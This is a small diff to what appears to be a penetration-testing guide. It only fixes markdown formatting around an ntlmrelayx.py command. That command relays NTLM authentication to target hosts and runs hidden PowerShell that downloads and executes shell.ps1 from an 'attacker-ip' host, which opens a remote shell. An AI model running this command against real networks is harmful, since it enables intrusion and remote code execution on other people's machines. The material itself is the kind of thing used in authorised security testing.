@@ -63,5 +63,5 @@ python3 -m http.server 80
 ```
 - Run NTLMRelayx.py with the Reverse Shell Command:
 ```bash
-`sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')\""`
+sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')\""
 ```
